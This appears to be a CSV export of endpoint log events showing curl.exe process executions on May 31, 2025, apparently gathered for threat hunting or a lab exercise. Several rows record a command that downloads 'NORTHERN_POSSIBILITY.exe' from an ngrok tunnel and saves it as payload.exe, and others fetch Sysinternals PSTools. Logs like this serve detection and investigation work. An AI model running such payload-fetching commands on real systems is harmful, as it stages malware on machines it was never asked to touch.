"@timestamp","process.command_line","process.name","file.extension"
"May 31, 2025 @ 14:51:36.447","-","curl.exe","-"
"May 31, 2025 @ 14:51:36.447","-","curl.exe","-"
"May 31, 2025 @ 14:51:12.818","-","curl.exe","-"
"May 31, 2025 @ 14:51:12.818","-","curl.exe","-"
"May 31, 2025 @ 14:51:12.575","-","curl.exe","-"
"May 31, 2025 @ 14:51:12.575","-","curl.exe","-"
"May 31, 2025 @ 14:51:12.575","-","curl.exe","-"
"May 31, 2025 @ 14:51:12.575","-","curl.exe","-"
"May 31, 2025 @ 14:50:40.804","-","curl.exe","-"
"May 31, 2025 @ 14:50:40.804","-","curl.exe","-"
"May 31, 2025 @ 14:32:23.734","-","curl.exe","-"
"May 31, 2025 @ 14:32:23.734","-","curl.exe","-"
"May 31, 2025 @ 14:32:23.503","-","curl.exe","-"
"May 31, 2025 @ 14:32:23.503","-","curl.exe","-"
"May 31, 2025 @ 14:32:23.503","-","curl.exe","-"
"May 31, 2025 @ 14:32:23.503","-","curl.exe","-"
"May 31, 2025 @ 14:32:23.198","curl  https://8f23-2401-4900-4deb-7fc2-3703-39b4-73d6-579b.ngrok-free.app/NORTHERN_POSSIBILITY.exe -o payload.exe","curl.exe","-"
"May 31, 2025 @ 14:32:23.198","curl  https://8f23-2401-4900-4deb-7fc2-3703-39b4-73d6-579b.ngrok-free.app/NORTHERN_POSSIBILITY.exe -o payload.exe","curl.exe","-"
"May 31, 2025 @ 14:29:09.479","-","curl.exe","-"
"May 31, 2025 @ 14:29:09.479","-","curl.exe","-"
"May 31, 2025 @ 14:26:26.488","-","curl.exe","-"
"May 31, 2025 @ 14:26:26.488","-","curl.exe","-"
"May 31, 2025 @ 14:26:26.313","-","curl.exe","-"
"May 31, 2025 @ 14:26:26.313","-","curl.exe","-"
"May 31, 2025 @ 14:26:26.313","-","curl.exe","-"
"May 31, 2025 @ 14:26:26.313","-","curl.exe","-"
"May 31, 2025 @ 14:26:26.045","curl  https://8f23-2401-4900-4deb-7fc2-3703-39b4-73d6-579b.ngrok-free.app/NORTHERN_POSSIBILITY.exe -o payload.exe","curl.exe","-"
"May 31, 2025 @ 14:26:26.045","curl  https://8f23-2401-4900-4deb-7fc2-3703-39b4-73d6-579b.ngrok-free.app/NORTHERN_POSSIBILITY.exe -o payload.exe","curl.exe","-"
"May 31, 2025 @ 14:14:51.273","-","curl.exe","-"
"May 31, 2025 @ 14:14:51.273","-","curl.exe","-"
"May 31, 2025 @ 14:11:26.325","-","curl.exe","-"
"May 31, 2025 @ 14:11:26.325","-","curl.exe","-"
"May 31, 2025 @ 14:11:26.140","-","curl.exe","-"
"May 31, 2025 @ 14:11:26.140","-","curl.exe","-"
"May 31, 2025 @ 14:11:26.140","-","curl.exe","-"
"May 31, 2025 @ 14:11:26.140","-","curl.exe","-"
"May 31, 2025 @ 14:11:25.639","curl  https://8f23-2401-4900-4deb-7fc2-3703-39b4-73d6-579b.ngrok-free.app/NORTHERN_POSSIBILITY.exe -o payload.exe","curl.exe","-"
"May 31, 2025 @ 14:11:25.639","curl  https://8f23-2401-4900-4deb-7fc2-3703-39b4-73d6-579b.ngrok-free.app/NORTHERN_POSSIBILITY.exe -o payload.exe","curl.exe","-"
"May 31, 2025 @ 13:42:20.655","-","curl.exe","-"
"May 31, 2025 @ 13:42:20.655","-","curl.exe","-"
"May 31, 2025 @ 13:42:20.212","-","curl.exe","-"
"May 31, 2025 @ 13:42:20.212","-","curl.exe","-"
"May 31, 2025 @ 13:42:20.141","-","curl.exe","-"
"May 31, 2025 @ 13:42:20.141","-","curl.exe","-"
"May 31, 2025 @ 13:42:20.141","-","curl.exe","-"
"May 31, 2025 @ 13:42:20.141","-","curl.exe","-"
"May 31, 2025 @ 13:42:19.906","curl  https://download.sysinternals.com/files/PSTools.zip -o ps.zip","curl.exe","-"
"May 31, 2025 @ 13:42:19.906","curl  https://download.sysinternals.com/files/PSTools.zip -o ps.zip","curl.exe","-"
"May 31, 2025 @ 13:42:10.582","-","curl.exe","-"
"May 31, 2025 @ 13:42:10.582","-","curl.exe","-"
"May 31, 2025 @ 13:42:10.521","-","curl.exe","-"
"May 31, 2025 @ 13:42:10.521","-","curl.exe","-"
"May 31, 2025 @ 13:42:10.521","-","curl.exe","-"
"May 31, 2025 @ 13:42:10.521","-","curl.exe","-"
"May 31, 2025 @ 13:42:10.239","-","curl.exe","-"
"May 31, 2025 @ 13:42:10.239","-","curl.exe","-"
"May 31, 2025 @ 13:42:10.126","-","curl.exe","-"
"May 31, 2025 @ 13:42:10.126","-","curl.exe","-"
"May 31, 2025 @ 13:42:10.126","-","curl.exe","-"
"May 31, 2025 @ 13:42:10.126","-","curl.exe","-"
"May 31, 2025 @ 13:42:09.528","curl  https://download.sysinternals.com/files/PSTools.zip ps.zip","curl.exe","-"
"May 31, 2025 @ 13:42:09.528","curl  https://download.sysinternals.com/files/PSTools.zip ps.zip","curl.exe","-"
